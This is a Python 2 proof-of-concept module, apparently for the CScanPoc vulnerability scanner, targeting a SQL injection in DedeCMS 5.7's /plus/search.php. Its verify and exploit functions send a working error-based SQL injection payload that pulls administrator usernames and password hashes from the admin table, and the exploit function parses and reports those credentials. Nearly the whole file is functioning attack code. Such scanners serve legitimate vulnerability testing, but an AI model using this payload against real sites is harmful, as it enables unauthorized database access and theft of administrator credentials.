# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'dedecms_0005_p_bb2' # 平台漏洞编号，留空
    name = 'Dedecms 5.7 /plus/search.php SQL注入漏洞' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'http://www.cnblogs.com/LittleHann/p/4505694.html'  # 漏洞公布时间
    desc = '''
        Dedecms 5.7 /plus/search.php SQL注入漏洞
    ''' # 漏洞描述
    ref = 'http://www.cnblogs.com/LittleHann/p/4505694.html' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'dedecms'  # 漏洞应用名称
    product_version = '5.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c2359723-5516-49a2-ab77-151e6c7daf6c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            search_poc = ("/plus/search.php?keyword=as&typeArr[111%3D@`\%27`)+and+(SELECT+1+FROM+(select+count(*),"
                    "concat(floor(rand(0)*2),(substring((select+group_CONCAT(0x5e,0x24,userid,0x7c,pwd,0x24,0x5e)"
                    "+from+`%23@__admin`+limit+0,5),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\%27`+]=a")
            
            attack_url = '{target}'.format(target=self.target)+search_poc
            user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}
            request = urllib2.Request(attack_url,headers=user_agent)
            response = urllib2.urlopen(request)
            if response.getcode() == 200:
                dmin_result = ""
                content = response.read()
                reg_admin = re.compile("(?<=\^\$).*?(?=\$\^)")
                admin_info = reg_admin.findall(content)
                admin_info_duplicate = sorted(set(admin_info),key=admin_info.index)
                if len(admin_info_duplicate) >0 :
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))
            search_poc = ("/plus/search.php?keyword=as&typeArr[111%3D@`\%27`)+and+(SELECT+1+FROM+(select+count(*),"
                    "concat(floor(rand(0)*2),(substring((select+group_CONCAT(0x5e,0x24,userid,0x7c,pwd,0x24,0x5e)"
                    "+from+`%23@__admin`+limit+0,5),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\%27`+]=a")
            
            attack_url = '{target}'.format(target=self.target)+search_poc
            user_agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.57 Safari/537.36'}
            request = urllib2.Request(attack_url,headers=user_agent)
            response = urllib2.urlopen(request)
            if response.getcode() == 200:
                dmin_result = ""
                content = response.read()
                reg_admin = re.compile("(?<=\^\$).*?(?=\$\^)")
                admin_info = reg_admin.findall(content)
                admin_info_duplicate = sorted(set(admin_info),key=admin_info.index)
                if len(admin_info_duplicate) >0 :
                    for info in admin_info_duplicate:
                       info_list = info.split("|")
                       info_name = info_list[0]
                       info_pwd = info_list[1][3:19]  
                       self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 用户密码为{password}'.format(target=self.target,name=self.vuln.name,username=info_name,password=info_pwd))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()
